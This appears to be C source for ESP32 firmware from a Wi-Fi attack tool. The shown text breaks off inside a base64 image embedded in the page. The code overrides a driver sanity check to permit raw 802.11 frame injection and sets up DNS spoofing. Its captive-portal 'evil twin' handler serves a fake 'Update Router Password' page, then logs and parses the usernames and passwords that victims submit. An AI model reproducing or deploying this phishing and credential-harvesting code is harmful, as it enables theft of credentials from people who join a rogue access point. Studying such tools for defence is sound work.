/*
Copyright (c) 2022 kl0ibi

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
 */
#include <string.h>
#include "htool_wifi.h"
#include "htool_display.h"
#include "htool_api.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "esp_spi_flash.h"
#include "lwip/sockets.h"
#include "lwip/err.h"
#include "esp_netif.h"

#include "lwip/err.h"
#include "lwip/sockets.h"
#include "lwip/sys.h"
#include "lwip/netdb.h"

#include "esp_http_server.h"

#define TAG "htool_wifi"


//TODO: DO BITALIGNMENT and BITSHIFTING

const int WIFI_SCAN_FINISHED_BIT = BIT0;
const int WIFI_CONNECTED = BIT1;

static TaskHandle_t htask;

htool_wifi_client_t *wifi_client = NULL;

wifi_ap_record_t *global_scans;

wifi_config_t *wifi_config = NULL;

uint16_t global_scans_num = 32;

uint8_t global_scans_count = 0;

uint8_t channel;

bool perform_active_scan = false;

bool perform_passive_scan = false;

bool scan_manually_stopped = false;

uint32_t sequence_number = 0;

wchar_t username1[22] = {0};
wchar_t username2[22] = {0};
wchar_t username3[22] = {0};
wchar_t username4[22] = {0};
wchar_t password[64] = {0};

captive_portal_task_args_t captive_portal_task_args;

#define DNS_PORT (53)
#define DNS_MAX_LEN (256)

#define OPCODE_MASK (0x7800)
#define QR_FLAG (1 << 7)
#define QD_TYPE_A (0x0001)
#define ANS_TTL_SEC (300)

extern int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { //redifned to override the check
    return 0;
}

// DNS Header Packet
typedef struct __attribute__((__packed__))
{
    uint16_t id;
    uint16_t flags;
    uint16_t qd_count;
    uint16_t an_count;
    uint16_t ns_count;
    uint16_t ar_count;
} dns_header_t;

// DNS Question Packet
typedef struct {
    uint16_t type;
    uint16_t class;
} dns_question_t;

// DNS Answer Packet
typedef struct __attribute__((__packed__))
{
    uint16_t ptr_offset;
    uint16_t type;
    uint16_t class;
    uint32_t ttl;
    uint16_t addr_len;
    uint32_t ip_addr;
} dns_answer_t;

bool cp_running = false;
bool target_connected = false;

typedef struct sockaddr_in sockaddr_in_t;

typedef struct rest_server_context {
    char base_path[15 + 1];
    char scratch[10240];
} rest_server_context_t;

httpd_handle_t server;
int sock = 0;

esp_err_t common_get_handler(httpd_req_t *req) {
    //get the header length
    size_t req_hdr_host_len = httpd_req_get_hdr_value_len(req, "Host");
    char req_hdr_host_value[req_hdr_host_len + 1]; // + \0
    esp_err_t response_err;

    if ((response_err = httpd_req_get_hdr_value_str(req, "Host", (char*)&req_hdr_host_value, req_hdr_host_len + 1)) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to get header value for Host %d", response_err);
    }

    ESP_LOGI(TAG, "Host Header value: %s", req_hdr_host_value);
    if (strncmp(req_hdr_host_value, "connectivitycheck.gstatic.com", strlen("connectivitycheck.gstatic.com")) == 0) { // for android (google) devices to change the location name //-> for apple devices the captive.apple.com is default used and cant be changed 
        httpd_resp_set_status(req, "302 Found");
        if (!captive_portal_task_args.is_evil_twin) {
            if (captive_portal_task_args.cp_index == 0) {
                httpd_resp_set_hdr(req, "Location", "http://google.com");
            }
            else {
                httpd_resp_set_hdr(req, "Location", "http://mcdonalds.com");
            }
        }
        else {
            httpd_resp_set_hdr(req, "Location", "http://192.168.8.1");
        }
        httpd_resp_send(req, NULL, 0);
    }
    else {
        char *buf = NULL;
        size_t buf_len = 0;

        if ((buf_len = httpd_req_get_url_query_len(req) + 1) != 0) {
            if ((buf = malloc(buf_len)) == NULL) {
                ESP_LOGE(TAG, "No free mem exit...");
            }
            if (httpd_req_get_url_query_str(req, buf, buf_len) == ESP_OK) {
                ESP_LOGI(TAG, "Idiot gave credentials %s", buf);
                bool username_reached = false;

                uint8_t pw_index = 0;

                uint8_t offset = 5;
                for (uint8_t i = 0; i < strlen(buf); i++) {
                    if (!username_reached) {
                        if (buf[i+offset] == '%') {
                            if (i < 20) { //TODO: to this username splitting later at display cuz of performance
                                username1[i] = '@';
                            }
                            else if (i < 40) {
                                username2[i-20] = '@';
                            }
                            else if (i < 60) {
                                username3[i-40] = '@';
                            }
                            else if (i < 80) {
                                username4[i-60] = '@';
                            }
                            offset = offset + 2;
                            continue;
                        }
                        else if (buf[i+offset] != '&') {
                            if (i < 20) {
                                username1[i] = buf[i+offset];
                                username2[0] = 0;
                                username3[0] = 0;
                                username4[0] = 0;
                            }
                            else if (i < 40) {
                                username2[i-20] = buf[i+offset];
                            }
                            else if (i < 60) {
                                username3[i-40] = buf[i+offset];
                            }
                            else if (i < 80) {
                                username4[i-60] = buf[i+offset];
                            }
                        }
                        else {
                            username_reached = true;
                            offset = 12;
                            if (i < 20) {
                                username1[i] = '\0';
                            }
                            else if (i < 40) {
                                username2[i-20] = '\0';
                            }
                            else if (i < 60) {
                                username3[i-40] = '\0';
                            }
                            else if (i < 80) {
                                username4[i-60] = '\0';
                            }
                            pw_index = i+1;
                        }
                    }
                    else {
                        if (buf[i+offset] == '%') {
                            password[i-pw_index] = '@';
                            offset = offset + 2;
                        }
                        if (buf[i+offset] != '&') {
                            password[i-pw_index] = buf[i+offset];
                        }
                        else {
                            password[i-pw_index] = '\0';
                            break;
                        }
                    }
                }
            }
        }
        FREE_MEM(buf);
    }
    //send response string with html site
    const char *response_str = (const char *)req->user_ctx;
    httpd_resp_send(req, response_str, strlen(response_str));

    if (httpd_req_get_hdr_value_len(req, "Host") == 0) {
        ESP_LOGI(TAG, "Request Host header lost");
    }

    return 0;
}

//region uri
//TODO: add embedded html sites instead of this
httpd_uri_t captive_portal_uri_router = {
        .uri = "/*",
        .method = HTTP_GET,
        .handler = common_get_handler,
        .user_ctx = "<html>\n"
                    "  <head>\n"
                    "<meta name='viewport' content='width=device-width,\n"
                    " initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>\n"
                    "    <title>Update Router Password</title>\n"
                    "    <style>\n"
                    "      body {\n"
                    "        font-family: Arial, sans-serif;\n"
                    "        margin: 0;\n"
                    "        padding: 0;\n"
                    "      }\n"
                    "      .container {\n"
                    "        max-width: 400px;\n"
                    "        margin: 0 auto;\n"
                    "        text-align: center;\n"
                    "      }\n"
                    "      h1 {\n"
                    "        margin: 20px 0;\n"
                    "      }\n"
                    "      p {\n"
                    "        margin: 10px 0;\n"
                    "      }\n"
                    "      form {\n"
                    "        text-align: left;\n"
                    "        padding: 20px;\n"
                    "        border: 1px solid #ccc;\n"
                    "        border-radius: 4px;\n"
                    "      }\n"
                    "      label {\n"
                    "        display: block;\n"
                    "        margin: 10px 0;\n"
                    "      }\n"
                    "      input[type=\"text\"], input[type=\"password\"] {\n"
                    "        width: 100%;\n"
                    "        padding: 12px 20px;\n"
                    "        margin: 8px 0;\n"
                    "        box-sizing: border-box;\n"
                    "        border: 1px solid #ccc;\n"
                    "        border-radius: 4px;\n"
                    "      }\n"
                    "      input[type=\"submit\"] {\n"
                    "        width: 100%;\n"
                    "        background-color: #4CAF50;\n"
                    "        color: white;\n"
                    "        padding: 14px 20px;\n"
                    "        margin: 8px 0;\n"
                    "        border: none;\n"
                    "        border-radius: 4px;\n"
                    "        cursor: pointer;\n"
                    "      }\n"
                    "      input[type=\"submit\"]:hover {\n"
                    "        background-color: #45a049;\n"
                    "      }\n"
                    "    </style>\n"
                    "</head>\n"
                    "<body>\n"
                    "<div class=\"container\">\n"
                    "<img src=\"data:image/webp;base64,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